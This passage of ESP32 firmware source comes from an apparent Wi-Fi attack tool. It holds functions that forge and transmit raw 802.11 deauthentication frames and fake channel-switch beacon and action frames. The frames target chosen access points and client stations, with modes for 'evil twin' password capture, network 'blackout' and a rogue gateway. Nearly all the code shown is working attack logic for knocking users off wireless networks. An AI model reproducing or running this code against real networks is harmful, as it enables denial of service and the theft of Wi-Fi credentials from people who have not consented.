brokali/projectZeroTouch/ESP32C5/main/main.c
    // Load BSSID whitelist from SD card
    if (sd_init_ret == ESP_OK) {
        load_whitelist_from_sd();
    } else {
        whitelistedBssidsCount = 0;
    }
    vTaskDelay(pdMS_TO_TICKS(500));
    MY_LOG_INFO(TAG,"BOARD READY");
    oled_display_update_full("> JanOS v" JANOS_VERSION,
                            sd_init_ret == ESP_OK ? "  SD: OK" : "  SD: MISSING!",
                            "",
                            "  > Ready _");
    vTaskDelay(pdMS_TO_TICKS(100));
    
}

static void wsl_bypasser_send_csa_frames(const target_bssid_t *target)
{
    static const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t decoy;
    uint8_t beacon[256];
    uint8_t action[32];
    int beacon_len;
    int action_len;

    if (!target) {
        return;
    }

    decoy = csa_decoy_channel(target->channel);
    beacon_len = build_csa_beacon_frame(beacon, sizeof(beacon),
                                        target->ssid, target->bssid,
                                        target->channel, decoy);
    if (beacon_len > 0) {
        wsl_bypasser_send_raw_frame(beacon, beacon_len);
    }

    action_len = build_csa_action_frame(action, sizeof(action),
                                        broadcast_mac, target->bssid, decoy);
    if (action_len > 0) {
        wsl_bypasser_send_raw_frame(action, action_len);
    }

    if (selected_stations_count > 0 && applicationState == DEAUTH) {
        for (int s = 0; s < selected_stations_count; s++) {
            if (!selected_stations[s].active) {
                continue;
            }
            action_len = build_csa_action_frame(action, sizeof(action),
                                                selected_stations[s].mac,
                                                target->bssid, decoy);
            if (action_len > 0) {
                wsl_bypasser_send_raw_frame(action, action_len);
            }
        }
    }
}

void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count) {   
    if (applicationState == EVIL_TWIN_PASS_CHECK ) {
        ESP_LOGW(TAG, "Deauth stop requested in Evil Twin flow, checking for password, will do nothing here..");
        return;
    }

    // Capture Gateway / Rogue GITM owns the radio channel (STA+SoftAP). Never hop.
    const bool gateway_radio_locked =
        capture_gateway_is_active() || rogue_gitm_mode_active;

    int softap_clients = portal_connected_clients;
    if (capture_gateway_is_active()) {
        capture_gateway_status_t cgw_st = {0};
        capture_gateway_get_status(&cgw_st);
        softap_clients = cgw_st.connected_clients;
    }

    //proceed with deauth frames on channels of the APs:
    // Use target_bssids[] directly to avoid index confusion after periodic re-scan
    for (int i = 0; i < target_bssid_count; ++i) {
        if (applicationState == EVIL_TWIN_PASS_CHECK ) {
            ESP_LOGW(TAG, "Checking for password...");
            return;
        }
        
        // Check for stop request
        if (operation_stop_requested) {
            ESP_LOGW(TAG, "Deauth: Stop requested, terminating...");
            return;
        }

        if (!target_bssids[i].active) continue;
        
        // Check if BSSID is whitelisted - but ONLY during blackout attack, not during regular deauth
        if (blackout_attack_active && is_bssid_whitelisted(target_bssids[i].bssid)) {
            continue;
        }
        
        // During evil twin / Rogue GITM with SoftAP clients, only attack same channel as SoftAP
        if ((applicationState == DEAUTH_EVIL_TWIN) && softap_clients > 0 && target_bssid_count > 0) {
            uint8_t first_network_channel = target_bssids[0].channel;
            if (target_bssids[i].channel != first_network_channel) {
                continue;
            }
        }
        
        // Channel hop only when SoftAP is not serving clients and GITM is not locking the radio
        if (!gateway_radio_locked &&
            (softap_clients == 0 || applicationState != DEAUTH_EVIL_TWIN)) {
            vTaskDelay(pdMS_TO_TICKS(50));
            esp_wifi_set_channel(target_bssids[i].channel, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(pdMS_TO_TICKS(50));
        }

        const bool send_deauth = authmode_needs_deauth(target_bssids[i].authmode);
        const bool send_csa = authmode_needs_csa(target_bssids[i].authmode);

        if (send_deauth) {
            // If stations are selected AND we're in regular DEAUTH mode (not evil_twin/blackout), send targeted deauth
            if (selected_stations_count > 0 && applicationState == DEAUTH) {
                for (int s = 0; s < selected_stations_count; s++) {
                    if (!selected_stations[s].active) continue;
                    
                    uint8_t deauth_frame[sizeof(deauth_frame_default)];
                    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
                    // Set destination to specific station (not broadcast!)
                    memcpy(&deauth_frame[4], selected_stations[s].mac, 6);
                    memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
                    memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
                    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                }
            } else {
                // Broadcast deauth (original behavior)
                uint8_t deauth_frame[sizeof(deauth_frame_default)];
                memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
                memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
                memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
                wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
            }
        }

        if (send_csa) {
            wsl_bypasser_send_csa_frames(&target_bssids[i]);
        }
        
        // If clients are connected during classic evil twin, return to SoftAP channel
        if (!gateway_radio_locked &&
            (applicationState == DEAUTH_EVIL_TWIN) && softap_clients > 0 && target_bssid_count > 0) {
            uint8_t first_network_channel = target_bssids[0].channel;
            esp_wifi_set_channel(first_network_channel, WIFI_SECOND_CHAN_NONE);
        }
    }
    
    // After sending all deauth frames, return to SoftAP channel during classic evil twin only
    if (!gateway_radio_locked &&
        (applicationState == DEAUTH_EVIL_TWIN) && target_bssid_count > 0) {
        uint8_t first_network_channel = target_bssids[0].channel;
        esp_wifi_set_channel(first_network_channel, WIFI_SECOND_CHAN_NONE);
    }

